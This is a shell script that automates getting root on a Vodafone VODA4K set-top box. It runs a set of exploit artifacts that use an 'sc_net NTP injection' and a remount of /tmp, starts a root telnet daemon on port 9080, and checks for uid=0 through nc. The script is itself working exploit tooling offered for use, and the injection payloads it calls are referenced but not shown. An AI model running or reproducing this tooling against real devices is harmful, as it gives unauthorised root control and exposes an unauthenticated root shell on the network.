#!/bin/sh
set -eu

host="${1:-192.168.100.11}"
console_port="${2:-9536}"
telnet_port="${3:-9080}"
here=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$here"

if [ "$telnet_port" != 9080 ]; then
    echo 'This recovery build is configured for the firewall-approved port 9080.' >&2
    exit 2
fi

required='vodafone-root-shell-setup.sh vodafone-root-shell.sh vodafone-direct-shell.sh vodafone-scnet-ntp-proof.sh scnet_ntp_dbus_probe.bin scnet-ddexec-bootstrap.bin root-loader.sh root-file-shell.sh root_tcp_shell.bin root-shell-bootstrap.bin'
for file in $required; do
    if [ ! -f "$file" ]; then
        echo "Missing required artifact: $here/$file" >&2
        exit 1
    fi
done

echo "Vodafone VODA4K root-telnet recovery: $host"
echo 'This will use the sc_net NTP injection and make a temporary exec remount of /tmp.'

./vodafone-root-shell-setup.sh "$host" "$console_port"

echo 'Verifying TCP 9080...'
if ! timeout 5 nc -z "$host" "$telnet_port" 2>/dev/null; then
    echo "Telnet did not become reachable on $host:$telnet_port." >&2
    echo 'Check that /mnt/usb0/busybox-armv7l exists on the box.' >&2
    exit 1
fi

proof=$(
    {
        sleep 1
        printf '/tmp/busybox id\r\n'
        printf 'exit\r\n'
        sleep 1
    } | timeout 7 nc "$host" "$telnet_port" 2>/dev/null || true
)

if ! printf '%s\n' "$proof" | grep -q 'uid=0(root)'; then
    echo 'Port 9080 is reachable, but the UID-0 telnet proof was not received.' >&2
    printf '%s\n' "$proof" >&2
    exit 1
fi

printf '%s\n' "$proof" | sed -n '/uid=0(root)/p'
echo
echo 'Root telnet is ready. Connect with:'
echo "  telnet $host $telnet_port"
echo
echo 'The /tmp remount, copied BusyBox, and telnet daemon are temporary and reset at reboot.'
